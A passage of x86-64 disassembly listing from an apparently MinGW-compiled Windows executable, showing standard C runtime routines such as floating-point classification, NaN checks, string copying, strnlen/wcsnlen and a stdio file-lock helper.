   140009229:	83 7d dc 0a          	cmpl   $0xa,-0x24(%rbp)
   14000922d:	7f 66                	jg     0x140009295
   14000922f:	b8 0b 00 00 00       	mov    $0xb,%eax
   140009234:	2b 45 dc             	sub    -0x24(%rbp),%eax
   140009237:	8b 55 f0             	mov    -0x10(%rbp),%edx
   14000923a:	89 c1                	mov    %eax,%ecx
   14000923c:	d3 ea                	shr    %cl,%edx
   14000923e:	89 d0                	mov    %edx,%eax
   140009240:	0d 00 00 f0 3f       	or     $0x3ff00000,%eax
   140009245:	89 45 d4             	mov    %eax,-0x2c(%rbp)
   140009248:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
   14000924c:	48 39 45 e0          	cmp    %rax,-0x20(%rbp)
   140009250:	73 10                	jae    0x140009262
   140009252:	48 83 6d f8 04       	subq   $0x4,-0x8(%rbp)
   140009257:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
   14000925b:	8b 00                	mov    (%rax),%eax
   14000925d:	89 45 f4             	mov    %eax,-0xc(%rbp)
   140009260:	eb 07                	jmp    0x140009269
   140009262:	c7 45 f4 00 00 00 00 	movl   $0x0,-0xc(%rbp)
   140009269:	8b 45 dc             	mov    -0x24(%rbp),%eax
   14000926c:	83 c0 15             	add    $0x15,%eax
   14000926f:	8b 55 f0             	mov    -0x10(%rbp),%edx
   140009272:	89 c1                	mov    %eax,%ecx
   140009274:	d3 e2                	shl    %cl,%edx
   140009276:	41 89 d0             	mov    %edx,%r8d
   140009279:	b8 0b 00 00 00       	mov    $0xb,%eax
   14000927e:	2b 45 dc             	sub    -0x24(%rbp),%eax
   140009281:	8b 55 f4             	mov    -0xc(%rbp),%edx
   140009284:	89 c1                	mov    %eax,%ecx
   140009286:	d3 ea                	shr    %cl,%edx
   140009288:	89 d0                	mov    %edx,%eax
   14000928a:	44 09 c0             	or     %r8d,%eax
   14000928d:	89 45 d0             	mov    %eax,-0x30(%rbp)
   140009290:	e9 ac 00 00 00       	jmp    0x140009341
   140009295:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
   140009299:	48 39 45 e0          	cmp    %rax,-0x20(%rbp)
   14000929d:	73 10                	jae    0x1400092af
   14000929f:	48 83 6d f8 04       	subq   $0x4,-0x8(%rbp)
   1400092a4:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
   1400092a8:	8b 00                	mov    (%rax),%eax
   1400092aa:	89 45 ec             	mov    %eax,-0x14(%rbp)
   1400092ad:	eb 07                	jmp    0x1400092b6
   1400092af:	c7 45 ec 00 00 00 00 	movl   $0x0,-0x14(%rbp)
   1400092b6:	83 6d dc 0b          	subl   $0xb,-0x24(%rbp)
   1400092ba:	83 7d dc 00          	cmpl   $0x0,-0x24(%rbp)
   1400092be:	74 70                	je     0x140009330
   1400092c0:	8b 45 dc             	mov    -0x24(%rbp),%eax
   1400092c3:	8b 55 f0             	mov    -0x10(%rbp),%edx
   1400092c6:	89 c1                	mov    %eax,%ecx
   1400092c8:	d3 e2                	shl    %cl,%edx
   1400092ca:	41 89 d0             	mov    %edx,%r8d
   1400092cd:	b8 20 00 00 00       	mov    $0x20,%eax
   1400092d2:	2b 45 dc             	sub    -0x24(%rbp),%eax
   1400092d5:	8b 55 ec             	mov    -0x14(%rbp),%edx
   1400092d8:	89 c1                	mov    %eax,%ecx
   1400092da:	d3 ea                	shr    %cl,%edx
   1400092dc:	89 d0                	mov    %edx,%eax
   1400092de:	44 09 c0             	or     %r8d,%eax
   1400092e1:	0d 00 00 f0 3f       	or     $0x3ff00000,%eax
   1400092e6:	89 45 d4             	mov    %eax,-0x2c(%rbp)
   1400092e9:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
   1400092ed:	48 39 45 e0          	cmp    %rax,-0x20(%rbp)
   1400092f1:	73 10                	jae    0x140009303
   1400092f3:	48 83 6d f8 04       	subq   $0x4,-0x8(%rbp)
   1400092f8:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
   1400092fc:	8b 00                	mov    (%rax),%eax
   1400092fe:	89 45 f0             	mov    %eax,-0x10(%rbp)
   140009301:	eb 07                	jmp    0x14000930a
   140009303:	c7 45 f0 00 00 00 00 	movl   $0x0,-0x10(%rbp)
   14000930a:	8b 45 dc             	mov    -0x24(%rbp),%eax
   14000930d:	8b 55 ec             	mov    -0x14(%rbp),%edx
   140009310:	89 c1                	mov    %eax,%ecx
   140009312:	d3 e2                	shl    %cl,%edx
   140009314:	41 89 d0             	mov    %edx,%r8d
   140009317:	b8 20 00 00 00       	mov    $0x20,%eax
   14000931c:	2b 45 dc             	sub    -0x24(%rbp),%eax
   14000931f:	8b 55 f0             	mov    -0x10(%rbp),%edx
   140009322:	89 c1                	mov    %eax,%ecx
   140009324:	d3 ea                	shr    %cl,%edx
   140009326:	89 d0                	mov    %edx,%eax
   140009328:	44 09 c0             	or     %r8d,%eax
   14000932b:	89 45 d0             	mov    %eax,-0x30(%rbp)
   14000932e:	eb 11                	jmp    0x140009341
   140009330:	8b 45 f0             	mov    -0x10(%rbp),%eax
   140009333:	0d 00 00 f0 3f       	or     $0x3ff00000,%eax
   140009338:	89 45 d4             	mov    %eax,-0x2c(%rbp)
   14000933b:	8b 45 ec             	mov    -0x14(%rbp),%eax
   14000933e:	89 45 d0             	mov    %eax,-0x30(%rbp)
   140009341:	f2 0f 10 45 d0       	movsd  -0x30(%rbp),%xmm0
   140009346:	48 83 c4 50          	add    $0x50,%rsp
   14000934a:	5d                   	pop    %rbp
   14000934b:	c3                   	ret
   14000934c:	55                   	push   %rbp
   14000934d:	53                   	push   %rbx
   14000934e:	48 83 ec 58          	sub    $0x58,%rsp
   140009352:	48 8d 6c 24 50       	lea    0x50(%rsp),%rbp
   140009357:	f2 0f 11 45 20       	movsd  %xmm0,0x20(%rbp)
   14000935c:	48 89 55 28          	mov    %rdx,0x28(%rbp)
   140009360:	4c 89 45 30          	mov    %r8,0x30(%rbp)
   140009364:	f2 0f 10 45 20       	movsd  0x20(%rbp),%xmm0
   140009369:	f2 0f 11 45 d8       	movsd  %xmm0,-0x28(%rbp)
   14000936e:	b9 01 00 00 00       	mov    $0x1,%ecx
   140009373:	e8 d5 f2 ff ff       	call   0x14000864d
   140009378:	48 89 45 f0          	mov    %rax,-0x10(%rbp)
   14000937c:	48 83 7d f0 00       	cmpq   $0x0,-0x10(%rbp)
   140009381:	75 0a                	jne    0x14000938d
   140009383:	b8 00 00 00 00       	mov    $0x0,%eax
   140009388:	e9 68 01 00 00       	jmp    0x1400094f5
   14000938d:	48 8b 45 f0          	mov    -0x10(%rbp),%rax
   140009391:	48 83 c0 18          	add    $0x18,%rax
   140009395:	48 89 45 e8          	mov    %rax,-0x18(%rbp)
   140009399:	8b 45 dc             	mov    -0x24(%rbp),%eax
   14000939c:	25 ff ff 0f 00       	and    $0xfffff,%eax
   1400093a1:	89 45 d0             	mov    %eax,-0x30(%rbp)
   1400093a4:	8b 45 dc             	mov    -0x24(%rbp),%eax
   1400093a7:	25 ff ff ff 7f       	and    $0x7fffffff,%eax
   1400093ac:	89 45 dc             	mov    %eax,-0x24(%rbp)
   1400093af:	8b 45 dc             	mov    -0x24(%rbp),%eax
   1400093b2:	c1 e8 14             	shr    $0x14,%eax
   1400093b5:	89 45 e4             	mov    %eax,-0x1c(%rbp)
   1400093b8:	83 7d e4 00          	cmpl   $0x0,-0x1c(%rbp)
   1400093bc:	74 0b                	je     0x1400093c9
   1400093be:	8b 45 d0             	mov    -0x30(%rbp),%eax
   1400093c1:	0d 00 00 10 00       	or     $0x100000,%eax
   1400093c6:	89 45 d0             	mov    %eax,-0x30(%rbp)
   1400093c9:	8b 45 d8             	mov    -0x28(%rbp),%eax
   1400093cc:	89 45 d4             	mov    %eax,-0x2c(%rbp)
   1400093cf:	8b 45 d4             	mov    -0x2c(%rbp),%eax
   1400093d2:	85 c0                	test   %eax,%eax
   1400093d4:	74 7b                	je     0x140009451
   1400093d6:	48 8d 45 d4          	lea    -0x2c(%rbp),%rax
   1400093da:	48 89 c1             	mov    %rax,%rcx
   1400093dd:	e8 26 f2 ff ff       	call   0x140008608
   1400093e2:	89 45 f8             	mov    %eax,-0x8(%rbp)
   1400093e5:	83 7d f8 00          	cmpl   $0x0,-0x8(%rbp)
   1400093e9:	74 2b                	je     0x140009416
   1400093eb:	8b 55 d0             	mov    -0x30(%rbp),%edx
   1400093ee:	b8 20 00 00 00       	mov    $0x20,%eax
   1400093f3:	2b 45 f8             	sub    -0x8(%rbp),%eax
   1400093f6:	89 c1                	mov    %eax,%ecx
   1400093f8:	d3 e2                	shl    %cl,%edx
   1400093fa:	8b 45 d4             	mov    -0x2c(%rbp),%eax
   1400093fd:	09 c2                	or     %eax,%edx
   1400093ff:	48 8b 45 e8          	mov    -0x18(%rbp),%rax
   140009403:	89 10                	mov    %edx,(%rax)
   140009405:	8b 55 d0             	mov    -0x30(%rbp),%edx
   140009408:	8b 45 f8             	mov    -0x8(%rbp),%eax
   14000940b:	89 c1                	mov    %eax,%ecx
   14000940d:	d3 ea                	shr    %cl,%edx
   14000940f:	89 d0                	mov    %edx,%eax
   140009411:	89 45 d0             	mov    %eax,-0x30(%rbp)
   140009414:	eb 09                	jmp    0x14000941f
   140009416:	8b 55 d4             	mov    -0x2c(%rbp),%edx
   140009419:	48 8b 45 e8          	mov    -0x18(%rbp),%rax
   14000941d:	89 10                	mov    %edx,(%rax)
   14000941f:	48 8b 45 e8          	mov    -0x18(%rbp),%rax
   140009423:	48 83 c0 04          	add    $0x4,%rax
   140009427:	8b 55 d0             	mov    -0x30(%rbp),%edx
   14000942a:	89 10                	mov    %edx,(%rax)
   14000942c:	8b 00                	mov    (%rax),%eax
   14000942e:	85 c0                	test   %eax,%eax
   140009430:	74 07                	je     0x140009439
   140009432:	ba 02 00 00 00       	mov    $0x2,%edx
   140009437:	eb 05                	jmp    0x14000943e
   140009439:	ba 01 00 00 00       	mov    $0x1,%edx
   14000943e:	48 8b 45 f0          	mov    -0x10(%rbp),%rax
   140009442:	89 50 14             	mov    %edx,0x14(%rax)
   140009445:	48 8b 45 f0          	mov    -0x10(%rbp),%rax
   140009449:	8b 40 14             	mov    0x14(%rax),%eax
   14000944c:	89 45 fc             	mov    %eax,-0x4(%rbp)
   14000944f:	eb 31                	jmp    0x140009482
   140009451:	48 8d 45 d0          	lea    -0x30(%rbp),%rax
   140009455:	48 89 c1             	mov    %rax,%rcx
   140009458:	e8 ab f1 ff ff       	call   0x140008608
   14000945d:	89 45 f8             	mov    %eax,-0x8(%rbp)
   140009460:	8b 55 d0             	mov    -0x30(%rbp),%edx
   140009463:	48 8b 45 e8          	mov    -0x18(%rbp),%rax
   140009467:	89 10                	mov    %edx,(%rax)
   140009469:	48 8b 45 f0          	mov    -0x10(%rbp),%rax
   14000946d:	c7 40 14 01 00 00 00 	movl   $0x1,0x14(%rax)
   140009474:	48 8b 45 f0          	mov    -0x10(%rbp),%rax
   140009478:	8b 40 14             	mov    0x14(%rax),%eax
   14000947b:	89 45 fc             	mov    %eax,-0x4(%rbp)
   14000947e:	83 45 f8 20          	addl   $0x20,-0x8(%rbp)
   140009482:	83 7d e4 00          	cmpl   $0x0,-0x1c(%rbp)
   140009486:	74 26                	je     0x1400094ae
   140009488:	8b 45 e4             	mov    -0x1c(%rbp),%eax
   14000948b:	8d 90 cd fb ff ff    	lea    -0x433(%rax),%edx
   140009491:	8b 45 f8             	mov    -0x8(%rbp),%eax
   140009494:	01 c2                	add    %eax,%edx
   140009496:	48 8b 45 28          	mov    0x28(%rbp),%rax
   14000949a:	89 10                	mov    %edx,(%rax)
   14000949c:	b8 35 00 00 00       	mov    $0x35,%eax
   1400094a1:	2b 45 f8             	sub    -0x8(%rbp),%eax
   1400094a4:	89 c2                	mov    %eax,%edx
   1400094a6:	48 8b 45 30          	mov    0x30(%rbp),%rax
   1400094aa:	89 10                	mov    %edx,(%rax)
   1400094ac:	eb 43                	jmp    0x1400094f1
   1400094ae:	8b 45 e4             	mov    -0x1c(%rbp),%eax
   1400094b1:	8d 90 ce fb ff ff    	lea    -0x432(%rax),%edx
   1400094b7:	8b 45 f8             	mov    -0x8(%rbp),%eax
   1400094ba:	01 c2                	add    %eax,%edx
   1400094bc:	48 8b 45 28          	mov    0x28(%rbp),%rax
   1400094c0:	89 10                	mov    %edx,(%rax)
   1400094c2:	8b 45 fc             	mov    -0x4(%rbp),%eax
   1400094c5:	c1 e0 05             	shl    $0x5,%eax
   1400094c8:	89 c3                	mov    %eax,%ebx
   1400094ca:	8b 45 fc             	mov    -0x4(%rbp),%eax
   1400094cd:	48 98                	cltq
   1400094cf:	48 c1 e0 02          	shl    $0x2,%rax
   1400094d3:	48 8d 50 fc          	lea    -0x4(%rax),%rdx
   1400094d7:	48 8b 45 e8          	mov    -0x18(%rbp),%rax
   1400094db:	48 01 d0             	add    %rdx,%rax
   1400094de:	8b 00                	mov    (%rax),%eax
   1400094e0:	89 c1                	mov    %eax,%ecx
   1400094e2:	e8 56 f1 ff ff       	call   0x14000863d
   1400094e7:	29 c3                	sub    %eax,%ebx
   1400094e9:	89 da                	mov    %ebx,%edx
   1400094eb:	48 8b 45 30          	mov    0x30(%rbp),%rax
   1400094ef:	89 10                	mov    %edx,(%rax)
   1400094f1:	48 8b 45 f0          	mov    -0x10(%rbp),%rax
   1400094f5:	48 83 c4 58          	add    $0x58,%rsp
   1400094f9:	5b                   	pop    %rbx
   1400094fa:	5d                   	pop    %rbp
   1400094fb:	c3                   	ret
   1400094fc:	55                   	push   %rbp
   1400094fd:	48 89 e5             	mov    %rsp,%rbp
   140009500:	48 89 4d 10          	mov    %rcx,0x10(%rbp)
   140009504:	48 89 55 18          	mov    %rdx,0x18(%rbp)
   140009508:	eb 05                	jmp    0x14000950f
   14000950a:	48 83 45 10 01       	addq   $0x1,0x10(%rbp)
   14000950f:	48 8b 45 18          	mov    0x18(%rbp),%rax
   140009513:	48 8d 50 01          	lea    0x1(%rax),%rdx
   140009517:	48 89 55 18          	mov    %rdx,0x18(%rbp)
   14000951b:	0f b6 10             	movzbl (%rax),%edx
   14000951e:	48 8b 45 10          	mov    0x10(%rbp),%rax
   140009522:	88 10                	mov    %dl,(%rax)
   140009524:	48 8b 45 10          	mov    0x10(%rbp),%rax
   140009528:	0f b6 00             	movzbl (%rax),%eax
   14000952b:	84 c0                	test   %al,%al
   14000952d:	75 db                	jne    0x14000950a
   14000952f:	48 8b 45 10          	mov    0x10(%rbp),%rax
   140009533:	5d                   	pop    %rbp
   140009534:	c3                   	ret
   140009535:	90                   	nop
   140009536:	90                   	nop
   140009537:	90                   	nop
   140009538:	90                   	nop
   140009539:	90                   	nop
   14000953a:	90                   	nop
   14000953b:	90                   	nop
   14000953c:	90                   	nop
   14000953d:	90                   	nop
   14000953e:	90                   	nop
   14000953f:	90                   	nop
   140009540:	55                   	push   %rbp
   140009541:	48 89 e5             	mov    %rsp,%rbp
   140009544:	48 83 ec 10          	sub    $0x10,%rsp
   140009548:	f2 0f 11 45 10       	movsd  %xmm0,0x10(%rbp)
   14000954d:	f2 0f 10 45 10       	movsd  0x10(%rbp),%xmm0
   140009552:	f2 0f 11 45 f0       	movsd  %xmm0,-0x10(%rbp)
   140009557:	8b 45 f4             	mov    -0xc(%rbp),%eax
   14000955a:	89 45 fc             	mov    %eax,-0x4(%rbp)
   14000955d:	8b 45 f0             	mov    -0x10(%rbp),%eax
   140009560:	8b 55 fc             	mov    -0x4(%rbp),%edx
   140009563:	81 e2 ff ff 0f 00    	and    $0xfffff,%edx
   140009569:	09 d0                	or     %edx,%eax
   14000956b:	89 45 f8             	mov    %eax,-0x8(%rbp)
   14000956e:	81 65 fc 00 00 f0 7f 	andl   $0x7ff00000,-0x4(%rbp)
   140009575:	8b 45 fc             	mov    -0x4(%rbp),%eax
   140009578:	0b 45 f8             	or     -0x8(%rbp),%eax
   14000957b:	85 c0                	test   %eax,%eax
   14000957d:	75 07                	jne    0x140009586
   14000957f:	b8 00 40 00 00       	mov    $0x4000,%eax
   140009584:	eb 2f                	jmp    0x1400095b5
   140009586:	83 7d fc 00          	cmpl   $0x0,-0x4(%rbp)
   14000958a:	75 07                	jne    0x140009593
   14000958c:	b8 00 44 00 00       	mov    $0x4400,%eax
   140009591:	eb 22                	jmp    0x1400095b5
   140009593:	81 7d fc 00 00 f0 7f 	cmpl   $0x7ff00000,-0x4(%rbp)
   14000959a:	75 14                	jne    0x1400095b0
   14000959c:	83 7d f8 00          	cmpl   $0x0,-0x8(%rbp)
   1400095a0:	74 07                	je     0x1400095a9
   1400095a2:	b8 00 01 00 00       	mov    $0x100,%eax
   1400095a7:	eb 0c                	jmp    0x1400095b5
   1400095a9:	b8 00 05 00 00       	mov    $0x500,%eax
   1400095ae:	eb 05                	jmp    0x1400095b5
   1400095b0:	b8 00 04 00 00       	mov    $0x400,%eax
   1400095b5:	48 83 c4 10          	add    $0x10,%rsp
   1400095b9:	5d                   	pop    %rbp
   1400095ba:	c3                   	ret
   1400095bb:	90                   	nop
   1400095bc:	90                   	nop
   1400095bd:	90                   	nop
   1400095be:	90                   	nop
   1400095bf:	90                   	nop
   1400095c0:	55                   	push   %rbp
   1400095c1:	53                   	push   %rbx
   1400095c2:	48 83 ec 38          	sub    $0x38,%rsp
   1400095c6:	48 8d 6c 24 30       	lea    0x30(%rsp),%rbp
   1400095cb:	48 89 cb             	mov    %rcx,%rbx
   1400095ce:	db 2b                	fldt   (%rbx)
   1400095d0:	db 7d d0             	fstpt  -0x30(%rbp)
   1400095d3:	db 6d d0             	fldt   -0x30(%rbp)
   1400095d6:	db 7d e0             	fstpt  -0x20(%rbp)
   1400095d9:	0f b7 45 e8          	movzwl -0x18(%rbp),%eax
   1400095dd:	98                   	cwtl
   1400095de:	25 ff 7f 00 00       	and    $0x7fff,%eax
   1400095e3:	89 45 fc             	mov    %eax,-0x4(%rbp)
   1400095e6:	83 7d fc 00          	cmpl   $0x0,-0x4(%rbp)
   1400095ea:	75 25                	jne    0x140009611
   1400095ec:	8b 45 e4             	mov    -0x1c(%rbp),%eax
   1400095ef:	89 45 f8             	mov    %eax,-0x8(%rbp)
   1400095f2:	8b 45 e0             	mov    -0x20(%rbp),%eax
   1400095f5:	0b 45 f8             	or     -0x8(%rbp),%eax
   1400095f8:	85 c0                	test   %eax,%eax
   1400095fa:	75 07                	jne    0x140009603
   1400095fc:	b8 00 40 00 00       	mov    $0x4000,%eax
   140009601:	eb 3d                	jmp    0x140009640
   140009603:	8b 45 f8             	mov    -0x8(%rbp),%eax
   140009606:	85 c0                	test   %eax,%eax
   140009608:	78 31                	js     0x14000963b
   14000960a:	b8 00 44 00 00       	mov    $0x4400,%eax
   14000960f:	eb 2f                	jmp    0x140009640
   140009611:	81 7d fc ff 7f 00 00 	cmpl   $0x7fff,-0x4(%rbp)
   140009618:	75 21                	jne    0x14000963b
   14000961a:	8b 45 e4             	mov    -0x1c(%rbp),%eax
   14000961d:	25 ff ff ff 7f       	and    $0x7fffffff,%eax
   140009622:	89 c2                	mov    %eax,%edx
   140009624:	8b 45 e0             	mov    -0x20(%rbp),%eax
   140009627:	09 d0                	or     %edx,%eax
   140009629:	85 c0                	test   %eax,%eax
   14000962b:	75 07                	jne    0x140009634
   14000962d:	b8 00 05 00 00       	mov    $0x500,%eax
   140009632:	eb 0c                	jmp    0x140009640
   140009634:	b8 00 01 00 00       	mov    $0x100,%eax
   140009639:	eb 05                	jmp    0x140009640
   14000963b:	b8 00 04 00 00       	mov    $0x400,%eax
   140009640:	48 83 c4 38          	add    $0x38,%rsp
   140009644:	5b                   	pop    %rbx
   140009645:	5d                   	pop    %rbp
   140009646:	c3                   	ret
   140009647:	90                   	nop
   140009648:	90                   	nop
   140009649:	90                   	nop
   14000964a:	90                   	nop
   14000964b:	90                   	nop
   14000964c:	90                   	nop
   14000964d:	90                   	nop
   14000964e:	90                   	nop
   14000964f:	90                   	nop
   140009650:	55                   	push   %rbp
   140009651:	48 89 e5             	mov    %rsp,%rbp
   140009654:	48 83 ec 10          	sub    $0x10,%rsp
   140009658:	f2 0f 11 45 10       	movsd  %xmm0,0x10(%rbp)
   14000965d:	f2 0f 10 45 10       	movsd  0x10(%rbp),%xmm0
   140009662:	f2 0f 11 45 f0       	movsd  %xmm0,-0x10(%rbp)
   140009667:	8b 45 f0             	mov    -0x10(%rbp),%eax
   14000966a:	89 45 fc             	mov    %eax,-0x4(%rbp)
   14000966d:	8b 45 f4             	mov    -0xc(%rbp),%eax
   140009670:	25 ff ff ff 7f       	and    $0x7fffffff,%eax
   140009675:	89 45 f8             	mov    %eax,-0x8(%rbp)
   140009678:	8b 45 fc             	mov    -0x4(%rbp),%eax
   14000967b:	f7 d8                	neg    %eax
   14000967d:	0b 45 fc             	or     -0x4(%rbp),%eax
   140009680:	c1 e8 1f             	shr    $0x1f,%eax
   140009683:	89 c2                	mov    %eax,%edx
   140009685:	8b 45 f8             	mov    -0x8(%rbp),%eax
   140009688:	09 d0                	or     %edx,%eax
   14000968a:	89 45 f8             	mov    %eax,-0x8(%rbp)
   14000968d:	b8 00 00 f0 7f       	mov    $0x7ff00000,%eax
   140009692:	2b 45 f8             	sub    -0x8(%rbp),%eax
   140009695:	89 45 f8             	mov    %eax,-0x8(%rbp)
   140009698:	8b 45 f8             	mov    -0x8(%rbp),%eax
   14000969b:	c1 f8 1f             	sar    $0x1f,%eax
   14000969e:	48 83 c4 10          	add    $0x10,%rsp
   1400096a2:	5d                   	pop    %rbp
   1400096a3:	c3                   	ret
   1400096a4:	90                   	nop
   1400096a5:	90                   	nop
   1400096a6:	90                   	nop
   1400096a7:	90                   	nop
   1400096a8:	90                   	nop
   1400096a9:	90                   	nop
   1400096aa:	90                   	nop
   1400096ab:	90                   	nop
   1400096ac:	90                   	nop
   1400096ad:	90                   	nop
   1400096ae:	90                   	nop
   1400096af:	90                   	nop
   1400096b0:	55                   	push   %rbp
   1400096b1:	53                   	push   %rbx
   1400096b2:	48 83 ec 38          	sub    $0x38,%rsp
   1400096b6:	48 8d 6c 24 30       	lea    0x30(%rsp),%rbp
   1400096bb:	48 89 cb             	mov    %rcx,%rbx
   1400096be:	db 2b                	fldt   (%rbx)
   1400096c0:	db 7d d0             	fstpt  -0x30(%rbp)
   1400096c3:	db 6d d0             	fldt   -0x30(%rbp)
   1400096c6:	db 7d e0             	fstpt  -0x20(%rbp)
   1400096c9:	0f b7 45 e8          	movzwl -0x18(%rbp),%eax
   1400096cd:	98                   	cwtl
   1400096ce:	01 c0                	add    %eax,%eax
   1400096d0:	25 ff ff 00 00       	and    $0xffff,%eax
   1400096d5:	89 45 fc             	mov    %eax,-0x4(%rbp)
   1400096d8:	8b 45 e0             	mov    -0x20(%rbp),%eax
   1400096db:	8b 55 e4             	mov    -0x1c(%rbp),%edx
   1400096de:	81 e2 ff ff ff 7f    	and    $0x7fffffff,%edx
   1400096e4:	09 d0                	or     %edx,%eax
   1400096e6:	89 45 f8             	mov    %eax,-0x8(%rbp)
   1400096e9:	8b 45 f8             	mov    -0x8(%rbp),%eax
   1400096ec:	f7 d8                	neg    %eax
   1400096ee:	0b 45 f8             	or     -0x8(%rbp),%eax
   1400096f1:	c1 e8 1f             	shr    $0x1f,%eax
   1400096f4:	89 c2                	mov    %eax,%edx
   1400096f6:	8b 45 fc             	mov    -0x4(%rbp),%eax
   1400096f9:	09 d0                	or     %edx,%eax
   1400096fb:	89 45 fc             	mov    %eax,-0x4(%rbp)
   1400096fe:	b8 fe ff 00 00       	mov    $0xfffe,%eax
   140009703:	2b 45 fc             	sub    -0x4(%rbp),%eax
   140009706:	89 45 fc             	mov    %eax,-0x4(%rbp)
   140009709:	8b 45 fc             	mov    -0x4(%rbp),%eax
   14000970c:	c1 f8 10             	sar    $0x10,%eax
   14000970f:	48 83 c4 38          	add    $0x38,%rsp
   140009713:	5b                   	pop    %rbx
   140009714:	5d                   	pop    %rbp
   140009715:	c3                   	ret
   140009716:	90                   	nop
   140009717:	90                   	nop
   140009718:	90                   	nop
   140009719:	90                   	nop
   14000971a:	90                   	nop
   14000971b:	90                   	nop
   14000971c:	90                   	nop
   14000971d:	90                   	nop
   14000971e:	90                   	nop
   14000971f:	90                   	nop
   140009720:	55                   	push   %rbp
   140009721:	48 89 e5             	mov    %rsp,%rbp
   140009724:	48 83 ec 10          	sub    $0x10,%rsp
   140009728:	48 89 4d 10          	mov    %rcx,0x10(%rbp)
   14000972c:	48 89 55 18          	mov    %rdx,0x18(%rbp)
   140009730:	48 8b 45 10          	mov    0x10(%rbp),%rax
   140009734:	48 89 45 f8          	mov    %rax,-0x8(%rbp)
   140009738:	eb 05                	jmp    0x14000973f
   14000973a:	48 83 45 f8 01       	addq   $0x1,-0x8(%rbp)
   14000973f:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
   140009743:	48 2b 45 10          	sub    0x10(%rbp),%rax
   140009747:	48 3b 45 18          	cmp    0x18(%rbp),%rax
   14000974b:	73 0b                	jae    0x140009758
   14000974d:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
   140009751:	0f b6 00             	movzbl (%rax),%eax
   140009754:	84 c0                	test   %al,%al
   140009756:	75 e2                	jne    0x14000973a
   140009758:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
   14000975c:	48 2b 45 10          	sub    0x10(%rbp),%rax
   140009760:	48 83 c4 10          	add    $0x10,%rsp
   140009764:	5d                   	pop    %rbp
   140009765:	c3                   	ret
   140009766:	90                   	nop
   140009767:	90                   	nop
   140009768:	90                   	nop
   140009769:	90                   	nop
   14000976a:	90                   	nop
   14000976b:	90                   	nop
   14000976c:	90                   	nop
   14000976d:	90                   	nop
   14000976e:	90                   	nop
   14000976f:	90                   	nop
   140009770:	55                   	push   %rbp
   140009771:	48 89 e5             	mov    %rsp,%rbp
   140009774:	48 83 ec 10          	sub    $0x10,%rsp
   140009778:	48 89 4d 10          	mov    %rcx,0x10(%rbp)
   14000977c:	48 89 55 18          	mov    %rdx,0x18(%rbp)
   140009780:	48 c7 45 f8 00 00 00 	movq   $0x0,-0x8(%rbp)
   140009787:	00 
   140009788:	eb 0a                	jmp    0x140009794
   14000978a:	48 83 45 f8 01       	addq   $0x1,-0x8(%rbp)
   14000978f:	48 83 45 10 02       	addq   $0x2,0x10(%rbp)
   140009794:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
   140009798:	48 3b 45 18          	cmp    0x18(%rbp),%rax
   14000979c:	73 0c                	jae    0x1400097aa
   14000979e:	48 8b 45 10          	mov    0x10(%rbp),%rax
   1400097a2:	0f b7 00             	movzwl (%rax),%eax
   1400097a5:	66 85 c0             	test   %ax,%ax
   1400097a8:	75 e0                	jne    0x14000978a
   1400097aa:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
   1400097ae:	48 83 c4 10          	add    $0x10,%rsp
   1400097b2:	5d                   	pop    %rbp
   1400097b3:	c3                   	ret
   1400097b4:	90                   	nop
   1400097b5:	90                   	nop
   1400097b6:	90                   	nop
   1400097b7:	90                   	nop
   1400097b8:	90                   	nop
   1400097b9:	90                   	nop
   1400097ba:	90                   	nop
   1400097bb:	90                   	nop
   1400097bc:	90                   	nop
   1400097bd:	90                   	nop
   1400097be:	90                   	nop
   1400097bf:	90                   	nop
   1400097c0:	55                   	push   %rbp
   1400097c1:	48 89 e5             	mov    %rsp,%rbp
   1400097c4:	48 8b 05 a5 2f 00 00 	mov    0x2fa5(%rip),%rax        # 0x14000c770
   1400097cb:	48 8b 00             	mov    (%rax),%rax
   1400097ce:	5d                   	pop    %rbp
   1400097cf:	c3                   	ret
   1400097d0:	55                   	push   %rbp
   1400097d1:	48 89 e5             	mov    %rsp,%rbp
   1400097d4:	48 8b 05 85 2f 00 00 	mov    0x2f85(%rip),%rax        # 0x14000c760
   1400097db:	48 8b 00             	mov    (%rax),%rax
   1400097de:	5d                   	pop    %rbp
   1400097df:	c3                   	ret
   1400097e0:	55                   	push   %rbp
   1400097e1:	48 89 e5             	mov    %rsp,%rbp
   1400097e4:	48 83 ec 20          	sub    $0x20,%rsp
   1400097e8:	48 89 4d 10          	mov    %rcx,0x10(%rbp)
   1400097ec:	b9 00 00 00 00       	mov    $0x0,%ecx
   1400097f1:	e8 4a 01 00 00       	call   0x140009940
   1400097f6:	48 39 45 10          	cmp    %rax,0x10(%rbp)
   1400097fa:	72 52                	jb     0x14000984e
   1400097fc:	b9 13 00 00 00       	mov    $0x13,%ecx
   140009801:	e8 3a 01 00 00       	call   0x140009940
   140009806:	48 3b 45 10          	cmp    0x10(%rbp),%rax
   14000980a:	72 42                	jb     0x14000984e
   14000980c:	b9 00 00 00 00       	mov    $0x0,%ecx
   140009811:	e8 2a 01 00 00       	call   0x140009940
   140009816:	48 8b 55 10          	mov    0x10(%rbp),%rdx
   14000981a:	48 29 c2             	sub    %rax,%rdx
   14000981d:	48 c1 fa 04          	sar    $0x4,%rdx
   140009821:	48 b8 ab aa aa aa aa 	movabs $0xaaaaaaaaaaaaaaab,%rax
   140009828:	aa aa aa 
   14000982b:	48 0f af c2          	imul   %rdx,%rax
   14000982f:	83 c0 10             	add    $0x10,%eax
   140009832:	89 c1                	mov    %eax,%ecx
   140009834:	e8 3f 08 00 00       	call   0x14000a078
   140009839:	48 8b 45 10          	mov    0x10(%rbp),%rax
   14000983d:	8b 40 18             	mov    0x18(%rax),%eax
   140009840:	80 cc 80             	or     $0x80,%ah
   140009843:	89 c2                	mov    %eax,%edx
   140009845:	48 8b 45 10          	mov    0x10(%rbp),%rax
   140009849:	89 50 18             	mov    %edx,0x18(%rax)
   14000984c:	eb 15                	jmp    0x140009863
   14000984e:	48 8b 45 10          	mov    0x10(%rbp),%rax
   140009852:	48 83 c0 30          	add    $0x30,%rax
   140009856:	48 89 c1             	mov    %rax,%rcx
